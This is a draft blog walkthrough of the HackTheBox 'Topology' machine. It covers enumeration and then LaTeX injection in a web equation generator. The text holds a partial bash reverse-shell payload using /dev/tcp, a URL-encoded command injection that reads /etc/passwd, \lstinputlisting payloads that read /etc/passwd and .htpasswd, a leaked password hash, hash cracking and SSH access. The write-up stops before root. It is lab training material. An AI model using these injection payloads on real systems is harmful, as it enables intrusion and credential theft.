---
title: Topology
date: 2023-09-20
draft: true
tags: ["HTB", "Write-up"]
categories: ["Machines"]
htb_link: https://app.hackthebox.com/machines/topology
level: easy
os: linux
---

## Machine Summary

| MachineName | {{ .Params.title }}    |
| ----------- | ---------------------- |
| HTB Link    | {{ .Params.htb_link }} |
| OS          | {{ .Params.os }}       |
| Level       | {{ .Params.level }}    |
| Seasonal    | No                     |

Start off with the usual; I always go for adding the IP to my hosts file as this is faster and easier.

```bash
echo "${IP_of_Box} topology.htb" | sudo tee -a /etc/hosts
```

Then I move to my first check; nmap

```bash
nmap -sCV topology.htb
```

This results in the following output:

```bash
┌──(kelly㉿Stardust)-[~/boxes]
└─$ nmap -sCV topology.htb
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 12:08 CEST
Nmap scan report for topology.htb (10.129.107.168)
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.64 seconds
```

We can clearly see that we have port 22 and 80 open. Let's check out the website.
It's some kind of university site; with a few software options:

- LaTeX Equation Generator
- PHPMyRefDB
- TopoMisk
- PlotoTopo

Only the LaTeX one is accessible; so let's check that out.

We navigate to http://latex.topology.htb/equation.php but it's an 404, which is normal considering the DNS name isn't resolving. So let's add it to our hosts file.

```bash
echo "${IP_of_Box} latex.topology.htb" | sudo tee -a /etc/hosts
```

And we're in. We can enter LaTeX code and it will generate an image for us. Let's try to get a reverse shell.

```latex
\documentclass{article}
\usepackage{graphicx}
\begin{document}
\immediate\write18{bash -c 'bash -i >& /dev/tcp/
```

No dice; 'Illegal Command'. It may be a little over the top. Let's try something simpler.

So we hit google; and find this [article](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection).

We also note down the URL of the error.

`http://latex.topology.htb/equation.php?eqn=%5Cinput%7B%7C%22%2Fbin%2Fhostname%22%7D+%5Cinput%7B%7C%22extractbb+%2Fetc%2Fpasswd+%3E+%2Ftmp%2Fb.tex%22%7D&submit=`

As a means of an error, I actually navigated to http://latex.topology.htb and am presented with all files within the webserver. There's no index. Here, I actually find which version of pdfTex is running in the logs. pdfTeX, Version 3.14159265-2.6-1.40.20
In these logs, I also see why the `\write18` command is not working. It's restricted. But we also see that & line parsing is enabled.

```text
entering extended mode
 restricted \write18 enabled.
 %&-line parsing enabled.
```

And in HackTricks, we find "You might need to adjust injection with wrappers as `\[` or `$`."
And try what they list to get info.

```latex
\input{/etc/passwd} # Nope
\lstinputlisting{/etc/passwd} # this one does work
```

And there we have it - we have our user and their homedir.

Let's try to get the user flag this way; `$\lstinputlisting{/home/vdaisley/user.txt}$`
No dice, we need ssh access. Alright, nmap said this was Apache 2.4.41, it's possible passwords are stored in the .htpasswd file. But where the beep is this file?

ffuf to the rescue.

````bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://topology.htb/ -H "Host: FUZZ.topology.htb"
```
This tells me straightaway we've got stats and dev going. Let's check out both.
http://stats.topology.htb (after adding it to my hosts file too) is just a graph, useless.
http://dev.topology.htb is a login page. This means we can poke around there. Since this is a login box from the browser, this must be .htaccess protected. Let's try to get the .htaccess file.


```latex
$\lstinputlisting{/var/www/dev/.htaccess}$
````

Oh baby, this literally says "Go check .htpasswd. So let's do that.

````latex

```latex
$\lstinputlisting{/var/www/dev/.htpasswd}$
````

And there it is.

`vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zsAIbIxTY0`

But this is a hash. Let's crack it. Since my colleague already explained this to me - ha!

```bash
john -w /usr/share/wordlists/rockyou.txt hashed
```

Now once we have our foothold via SSH; we've got the user flag. Let's get root.

```bash
sshpass -p 'password' ssh vdaisley@topology.htb
whoami
hostname
cat user.txt
```
